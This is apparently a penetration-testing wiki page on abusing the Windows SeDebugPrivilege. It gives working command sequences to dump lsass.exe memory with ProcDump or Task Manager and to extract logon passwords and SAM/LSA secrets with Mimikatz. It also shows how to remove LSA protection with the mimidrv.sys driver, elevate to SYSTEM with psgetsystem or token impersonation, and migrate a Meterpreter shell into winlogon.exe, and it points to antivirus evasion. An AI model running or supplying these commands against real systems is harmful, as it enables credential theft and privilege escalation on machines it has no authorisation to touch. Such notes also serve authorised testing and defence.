# SeDebugPrivilege

SeDebugPrivilege is a token can be assigned via local or domain group policy to account which then are allowed the use of Debuggers. Debuggers by design, have access to system memory, kernel and application structures . The reading and write to and of memory should be sparingly granted. See [[SePrivilege-Token-Table]] for full listing of all abusable and non-abusable tokens.  For testing consider [Lee Holms adjusting-token-privileges-in-powershell article](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).


Dumping important processes that contain credentials like Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) 

- `Taskmanager -> [Right Click] lsass.exe -> Create dump file `or  [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) to dump `lsass.exe` then [[Mimikatz-Cheatsheet]]. Or script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1). - See [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re)

```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
privilege::debug
# Log to a txt file as the output can get very large 
log 
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords 
````

- With just Mimikatz - [[Mimikatz-Cheatsheet]]
```powershell
privilege::debug
# Log to a txt file as the output can get very large 
log 
sekurlsa::logonpasswords
# ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
# Means LSA protection:
!+ # mimidrv.sys driver disables LSA protection.
!processprotect /process:lsass.exe /remove
```
- Both require mimidrv.sys and dll - beware, may all require [[Antivirus-Evasion]]
```powershell
privilege::debug # enables the _SeDebugPrivilge_ access right
# Log to a txt file as the output can get very large 
log 
token::elevate # elevate the security token Administrator -> SYSTEM
!+ # LSA protection bypass!
lsadump::lsa /patch
lsadump::sam
sekurlsa::logonPasswords
```


[By following the instructions of this Decoder article](https://decoder.cloud/2018/02/02/getting-system/) and launching a [child process](https://learn.microsoft.com/en-us/windows/win32/procthread/child-processes), elevating to SYSTEM with SeDebugPrivilege by inheriting the token of a parent process thereby impersonating that security context. 
- Transfer [psgetsystem](https://github.com/decoder-it/psgetsystem)
-  Run [psgetsystem](https://github.com/decoder-it/psgetsystem) with either:
	- the auto-invoke: `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`
	- `.\psgetsys.ps1 $PID c:\windows\system32\cmd.exe`
```powershell
[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"") 
# or
ImpersonateFromParentPid -ppid <parent pid> -command <command to execute> -cmdargs <command arguments>
```

Or `EnableAllTokenPrivs.ps1`, get a `set AutoRunScript post/windows/manage/migrate true` on a x64 Meterpreter shell and then manually `migrate` to `winlogon.exe` process from the `ps` listing of all process. 

## References

[psgetsystem](https://github.com/decoder-it/psgetsystem)
[LeeHolmes](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)
[Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/procthread/child-processes)
[FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)
[ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 
[SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) 
[@daem0nc0re](https://twitter.com/daem0nc0re)
[Decoder article](https://decoder.cloud/2018/02/02/getting-system/)
[daem0nc0re PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)